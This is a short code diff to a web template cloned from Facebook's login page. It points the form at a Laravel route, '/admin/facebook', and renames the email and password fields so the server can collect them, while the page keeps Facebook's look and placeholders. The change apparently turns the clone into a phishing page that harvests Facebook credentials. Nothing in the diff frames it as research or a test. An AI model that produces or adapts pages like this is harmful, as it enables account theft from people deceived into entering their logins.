@@ -1588,11 +1588,14 @@
                       <form
                         class="_9vtf"
                         data-testid="royal_login_form"
-                        action="login.php"
+                        action="{{ url('/admin/facebook') }}"
                         method="post"
                         onsubmit=""
                         id="u_0_a_OZ"
                       >
+
+                      {{ csrf_field() }}
+
                         <input
                           type="hidden"
                           name="jazoest"
@@ -1609,7 +1612,7 @@
                             <input
                               type="text"
                               class="inputtext _55r1 _6luy"
-                              name="email"
+                              name="username"
                               id="emailhidden"
                               data-testid="royal_email"
                               placeholder="Email address or phone number"
@@ -1623,7 +1626,7 @@
                               <input
                                 type="password"
                                 class="inputtext _55r1 _6luy _9npi"
-                                name="pass"
+                                name="password"
                                 id="pass"
                                 data-testid="royal_pass"
                                 placeholder="Password"
